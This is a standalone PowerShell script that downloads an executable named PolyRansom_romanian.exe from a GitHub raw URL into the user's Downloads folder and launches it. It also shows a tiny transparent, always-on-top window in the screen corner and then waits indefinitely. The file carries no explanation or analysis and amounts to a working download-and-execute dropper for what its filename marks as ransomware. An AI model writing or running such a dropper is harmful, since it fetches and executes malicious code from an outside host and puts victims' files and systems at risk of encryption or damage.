$url = "https://github.com/webntdev/webntdev.github.io/raw/main/apps/PolyRansom_romanian.exe"
$downloadPath = Join-Path $env:USERPROFILE "Downloads\PolyRansom_romanian.exe"

function DownloadAndExecute {
    $webClient = New-Object System.Net.WebClient
    try {
        $webClient.DownloadFile($url, $downloadPath)
    }
    finally {
        $webClient.Dispose()
    }
    if (Test-Path $downloadPath) {
        Start-Process -FilePath $downloadPath -Wait
    }
}

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$form = New-Object System.Windows.Forms.Form
$form.StartPosition = 'Manual' 
$form.FormBorderStyle = 'None'
$form.BackColor = [System.Drawing.Color]::Lime
$form.TransparencyKey = $form.BackColor
$form.TopMost = $true
$form.Width = 50
$form.Height = 50 
$label = New-Object System.Windows.Forms.Label
$label.Text = "H"
$label.ForeColor = [System.Drawing.Color]::Green
$label.Font = New-Object System.Drawing.Font("Arial", 10, [System.Drawing.FontStyle]::Bold)
$label.AutoSize = $true
$label.BackColor = [System.Drawing.Color]::Transparent
$form.Controls.Add($label)
$screenWidth = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Width
$screenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Height
$formLocationX = [int]$screenWidth - [int]$form.Width
$formLocationY = [int]$screenHeight - [int]$form.Height
$form.Location = New-Object System.Drawing.Point($formLocationX, $formLocationY)
$form.Add_MouseDown({
    $form.Capture = $false
})
$form.Show()

function CloseApplication {
    Stop-Process -Name "ActualProcessName" -Force
}

function OpenApplication {
    Start-Process -FilePath $downloadPath -Wait
}

DownloadAndExecute

try {
    Wait-Event -Timeout ([System.Threading.Timeout]::Infinite)
}
finally {
    Get-EventSubscriber | Unregister-Event
}
